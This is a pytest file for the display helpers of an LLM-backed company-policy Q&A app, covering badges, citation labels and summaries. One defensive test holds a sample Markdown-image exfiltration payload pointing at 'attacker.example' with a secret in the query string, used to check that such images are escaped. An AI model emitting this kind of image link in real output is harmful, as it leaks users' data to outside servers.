from ui.formatting import (
    badge,
    reingest_summary,
    safe_markdown,
    section_text,
    source_label,
    upload_summary,
)

LLM_ANSWER = {"mode": "llm", "model": "llama3.2:3b", "fallback_reason": None}


def test_badge_for_an_ai_answer_names_the_model() -> None:
    assert badge(LLM_ANSWER) == "🤖 AI answer from the policies (llama3.2:3b)"


def test_badge_for_a_refusal() -> None:
    assert badge({"mode": "refused", "model": None, "fallback_reason": None}) == (
        "🚫 Not covered by the policies"
    )


def test_badge_for_extractive_mode_without_an_llm() -> None:
    assert badge({"mode": "extractive", "model": None, "fallback_reason": None}) == (
        "📄 Policy text (AI answers are switched off)"
    )


def test_badge_explains_a_fallback_in_plain_words() -> None:
    expected = {
        "llm_unavailable": "the AI model couldn't be reached",
        "llm_timeout": "the AI model took too long",
        "llm_model_missing": "the AI model isn't downloaded yet",
        "llm_error": "the AI model returned an error",
        "llm_bad_response": "the AI model returned an error",
        "llm_no_valid_citation": "the AI answer didn't cite the policies",
        "llm_empty_answer": "the AI answer was empty",
        "something_new": "something_new",
    }
    for reason, words in expected.items():
        answer = {"mode": "extractive", "model": None, "fallback_reason": reason}
        assert badge(answer) == f"📄 Policy text (no AI answer: {words})"


def test_source_label_shows_number_document_section_and_score() -> None:
    citation = {
        "number": 2,
        "document_title": "Leave Policy",
        "section": "4.1 Annual Leave Entitlement",
        "similarity": 0.77234,
    }

    assert source_label(citation) == "[2] Leave Policy — 4.1 Annual Leave Entitlement · 0.77"


def test_section_text_joins_the_sections_chunks_without_the_repeated_paragraph() -> None:
    document = {
        "sections": [
            {"section": "3. Other", "chunks": [{"id": 1, "text": "Unrelated."}]},
            {
                "section": "4.3 Carry Forward",
                "chunks": [
                    {"id": 2, "text": "First paragraph.\n\nShared paragraph."},
                    # Chunks of a long section overlap by one paragraph.
                    {"id": 3, "text": "Shared paragraph.\n\nLast paragraph."},
                ],
            },
        ]
    }

    assert section_text(document, "4.3 Carry Forward") == (
        "First paragraph.\n\nShared paragraph.\n\nLast paragraph."
    )


def test_section_text_of_a_missing_section_is_empty() -> None:
    assert section_text({"sections": []}, "9. Nothing") == ""


def test_upload_summary() -> None:
    result = {"status": "created", "document": {"title": "Training Policy", "chunks": 11}}

    assert upload_summary(result) == "Training Policy: created (11 chunks)."


def test_reingest_summary_counts_each_status() -> None:
    results = [
        {"slug": "a", "status": "unchanged", "chunks": 3},
        {"slug": "b", "status": "unchanged", "chunks": 4},
        {"slug": "c", "status": "removed", "chunks": 0},
    ]

    assert reingest_summary(results) == "Re-ingested 3 policies: 2 unchanged, 1 removed."


def test_safe_markdown_stops_images_loading_by_themselves() -> None:
    # A browser fetches a Markdown image at once, so text from an uploaded policy or an
    # LLM answer could send data to any server. A link needs a click instead.
    text = "See ![chart](https://attacker.example/p.png?q=secret) and ![x][ref]."

    assert safe_markdown(text) == (
        "See \\![chart](https://attacker.example/p.png?q=secret) and \\![x][ref]."
    )


def test_safe_markdown_leaves_ordinary_text_alone() -> None:
    text = "| Years | Days |\n|---|---|\n| 0-2 | 14 |\n\n> Quoted! [1]"

    assert safe_markdown(text) == text
